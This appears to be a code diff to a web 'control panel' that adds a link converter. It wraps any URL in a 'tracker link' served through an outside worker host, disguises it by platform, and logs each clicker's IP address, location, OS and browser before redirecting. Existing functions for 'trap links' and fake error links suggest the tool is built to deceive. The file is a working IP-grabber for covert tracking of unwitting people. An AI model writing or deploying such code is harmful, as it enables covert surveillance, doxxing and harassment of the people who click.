@@ -142,7 +142,7 @@ ul.devlist li:last-child{border-bottom:none}
   <div style="display:flex;flex-direction:column;align-items:center;gap:4px;margin-bottom:28px">
     <div style="font-size:1.35rem;font-weight:800;letter-spacing:.12em;color:#fff">SC6</div>
     <div style="font-size:.58rem;font-weight:600;letter-spacing:.2em;color:rgba(255,255,255,.22);text-transform:uppercase">Control Panel</div>
-    <div style="font-size:.6rem;font-weight:500;letter-spacing:.1em;color:rgba(192,0,14,.6);font-family:'Manrope',sans-serif;margin-top:2px">v1.4.9</div>
+    <div style="font-size:.6rem;font-weight:500;letter-spacing:.1em;color:rgba(192,0,14,.6);font-family:'Manrope',sans-serif;margin-top:2px">v1.5.0</div>
   </div>
   <div class="home-btns">
     <button class="home-btn" id="btnDev">
@@ -214,6 +214,22 @@ ul.devlist li:last-child{border-bottom:none}
           <button class="btn-sm" id="devMsgSend">Send</button>
         </div>
         <div id="devMsgSent" style="display:none;font-size:.7rem;color:#4fc;margin-top:6px">✓ Message sent</div>
+      </div>
+    </section>
+
+    <section>
+      <div class="sec-head"><h3>Link converter</h3><p class="note" style="margin:4px 0 0">Convert any URL into a tracker link. Logs visitor info then redirects instantly.</p></div>
+      <div class="sec-body">
+        <div class="row">
+          <input type="text" id="devConvertInput" maxlength="500" placeholder="Paste any URL…" style="flex:1">
+          <button class="btn-sm" id="devConvertBtn">Convert</button>
+        </div>
+        <div id="devConvertResult" style="display:none;margin-top:8px;background:rgba(255,200,0,.07);border:1px solid rgba(255,200,0,.2);border-radius:7px;padding:9px 11px">
+          <div style="font-size:.62rem;color:#f5c800;font-weight:700;letter-spacing:.06em;margin-bottom:4px">TRACKER LINK READY</div>
+          <div id="devConvertUrl" style="font-size:.7rem;color:#ccc;word-break:break-all;line-height:1.5"></div>
+          <button class="btn-sm" id="devConvertCopy" style="margin-top:7px;font-size:.68rem">Copy link</button>
+        </div>
+        <ul class="devlist" id="devRedirectList" style="margin-top:8px"></ul>
       </div>
     </section>
 
@@ -457,7 +473,10 @@ function trapLinksUrl(){return fbUrl('_sc6/workspaces/'+getSyncCode()+'/trapLink
 function trapLogsUrl(id){return fbUrl('_sc6/workspaces/'+getSyncCode()+'/trapLogs'+(id?'/'+id:''))}
 function trapGenEnabledUrl(){return fbUrl('_sc6/trapGenEnabled')}
 function trapLinksEnabledUrl(){return fbUrl('_sc6/trapLinksEnabled')}
+function redirectLinksUrl(){return fbUrl('_sc6/workspaces/'+getSyncCode()+'/redirectLinks')}
+function redirectLogsUrl(id){return fbUrl('_sc6/workspaces/'+getSyncCode()+'/redirectLogs'+(id?'/'+id:''))}
 var ERROR_PAGE_BASE=location.origin+location.pathname.replace(/[^/]*$/,'')+'error.html';
+var WORKER_BASE='https://media.sharelink-1.workers.dev';
 
 // ── Device tag ──
 function deviceTag(){
@@ -638,6 +657,7 @@ function openDev(whichCode){
   exLog('Dev panel opened','Code: '+_currentDevCode,'dev '+_currentDevCode);
   renderDevSync();
   loadDevTrapList();
+  loadDevRedirectList();
   loadDevMessage();
   loadDevReply();
   refreshDevTrapStatus();
@@ -1432,6 +1452,116 @@ function loadDevTrapList(){
     });
   });
 }
+// ── Platform hint from URL ──
+function platformParam(url){
+  if(/youtu\.be|youtube\.com/i.test(url))return'yt';
+  if(/instagram\.com|instagr\.am/i.test(url))return'ig';
+  if(/tiktok\.com/i.test(url))return'tt';
+  if(/twitter\.com|x\.com/i.test(url))return'tw';
+  if(/snapchat\.com/i.test(url))return'sc';
+  if(/facebook\.com|fb\.com/i.test(url))return'fb';
+  if(/discord\.com|discord\.gg/i.test(url))return'dc';
+  if(/twitch\.tv/i.test(url))return'tv';
+  if(/spotify\.com/i.test(url))return'sp';
+  if(/soundcloud\.com/i.test(url))return'sl';
+  if(/reddit\.com/i.test(url))return'rd';
+  if(/whatsapp\.com|wa\.me/i.test(url))return'wa';
+  if(/telegram\.me|t\.me/i.test(url))return'tg';
+  return'r';
+}
+
+// ── Load dev redirect list ──
+function loadDevRedirectList(){
+  var list=document.getElementById('devRedirectList');
+  if(!list)return;
+  fetch(redirectLinksUrl()).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(data){
+    var obj=data&&typeof data==='object'&&!Array.isArray(data)?data:{};
+    var keys=Object.keys(obj);
+    if(!keys.length){list.innerHTML='<li style="color:#888;font-size:.7rem">No redirect links yet.</li>';return;}
+    var sc=getSyncCode();
+    list.innerHTML=keys.map(function(id){
+      var e=obj[id];
+      var param=e.param||'r';
+      var url=WORKER_BASE+'/r?'+param+'='+encodeURIComponent(id)+'&ws='+encodeURIComponent(sc);
+      var dest=e.target?e.target.slice(0,40)+'…':'?';
+      return '<li style="padding:5px 0;border-bottom:1px solid rgba(255,255,255,.07)">'
+        +'<div style="font-size:.65rem;color:#888;margin-bottom:2px">→ '+esc(dest)+'</div>'
+        +'<div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap">'
+        +'<code style="font-size:.65rem;color:#f5c800;background:rgba(255,200,0,.1);padding:1px 5px;border-radius:3px;word-break:break-all;flex:1">'+esc(url)+'</code>'
+        +'<button class="btn-sm" style="font-size:.65rem;padding:2px 7px" data-redir-copy="'+esc(url)+'">Copy</button>'
+        +'<button class="btn-sm" style="font-size:.65rem;padding:2px 7px" data-redir-hits="'+esc(id)+'">Hits</button>'
+        +'<button class="btn-sm danger" style="font-size:.65rem;padding:2px 7px" data-redir-del="'+esc(id)+'">Del</button>'
+        +'</div>'
+        +'<ul class="devlist" id="devrhits-'+esc(id)+'" style="display:none;margin-top:5px"></ul>'
+        +'</li>';
+    }).join('');
+    list.querySelectorAll('[data-redir-copy]').forEach(function(btn){
+      btn.addEventListener('click',function(){
+        navigator.clipboard.writeText(btn.getAttribute('data-redir-copy')).catch(function(){});
+        btn.textContent='✓';setTimeout(function(){btn.textContent='Copy';},1500);
+      });
+    });
+    list.querySelectorAll('[data-redir-hits]').forEach(function(btn){
+      btn.addEventListener('click',function(){
+        var id=btn.getAttribute('data-redir-hits');
+        var sub=document.getElementById('devrhits-'+id);
+        if(sub.style.display!=='none'){sub.style.display='none';btn.textContent='Hits';return;}
+        btn.textContent='Hide';sub.style.display='';
+        sub.innerHTML='<li style="color:#888">Loading…</li>';
+        fetch(redirectLogsUrl(id)).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(logs){
+          var arr=Array.isArray(logs)?logs.slice().reverse():[];
+          if(!arr.length){sub.innerHTML='<li style="color:#888;font-size:.7rem">No hits yet.</li>';return;}
+          sub.innerHTML=arr.map(function(h){
+            var geo=[h.country,h.region].filter(Boolean).join(', ')||'Unknown';
+            var dev=[h.os,h.browser].filter(Boolean).join(' · ')||'?';
+            return '<li style="padding:4px 0;font-size:.68rem;color:#ccc;border-bottom:1px solid rgba(255,255,255,.05)">'
+              +'<div style="color:#4fc">'+esc(geo)+'</div>'
+              +'<div style="color:#aaa">'+esc(dev)+(h.ip?' · '+esc(h.ip):'')+'</div>'
+              +'<div style="color:#666;font-size:.6rem">'+esc(new Date(h.time).toLocaleString())+'</div>'
+              +'</li>';
+          }).join('');
+        });
+      });
+    });
+    list.querySelectorAll('[data-redir-del]').forEach(function(btn){
+      btn.addEventListener('click',function(){
+        var id=btn.getAttribute('data-redir-del');
+        if(!confirm('Delete this redirect link?'))return;
+        fetch(fbUrl('_sc6/workspaces/'+getSyncCode()+'/redirectLinks/'+id),{method:'DELETE'}).then(function(){
+          exLog('Redirect link deleted','ID: '+id,'dev '+_currentDevCode);
+          loadDevRedirectList();
+        }).catch(function(e){alert('Failed: '+e.message);});
+      });
+    });
+  });
+}
+
+// ── Convert button ──
+document.getElementById('devConvertBtn').addEventListener('click',function(){
+  var raw=document.getElementById('devConvertInput').value.trim();
+  if(!raw){alert('Paste a URL first.');return;}
+  var target=raw;
+  if(!/^https?:\/\//i.test(target))target='https://'+target;
+  var param=platformParam(target);
+  var id=Math.random().toString(36).slice(2,8)+Math.random().toString(36).slice(2,8);
+  var sc=getSyncCode();
+  var entry={target:target,param:param,createdAt:new Date().toISOString(),createdBy:deviceTag(),workspace:sc};
+  syncFetch(fbUrl('_sc6/workspaces/'+sc+'/redirectLinks/'+id),{method:'PUT',body:JSON.stringify(entry)}).then(function(){
+    var url=WORKER_BASE+'/r?'+param+'='+encodeURIComponent(id)+'&ws='+encodeURIComponent(sc);
+    exLog('Redirect link created','Target: '+target.slice(0,60),'dev '+_currentDevCode);
+    document.getElementById('devConvertUrl').textContent=url;
+    document.getElementById('devConvertResult').style.display='';
+    document.getElementById('devConvertInput').value='';
+    loadDevRedirectList();
+    navigator.clipboard.writeText(url).catch(function(){});
+  }).catch(function(e){alert('Failed: '+e.message);});
+});
+document.getElementById('devConvertCopy').addEventListener('click',function(){
+  var url=document.getElementById('devConvertUrl').textContent;
+  navigator.clipboard.writeText(url).catch(function(){});
+  this.textContent='✓ Copied';setTimeout(function(){document.getElementById('devConvertCopy').textContent='Copy link';},1500);
+});
+
 document.getElementById('devTrapGen').addEventListener('click',function(){
   trapGenEnabled(function(enabled){
     if(!enabled){alert('Error link generation is disabled by the operator.');return;}
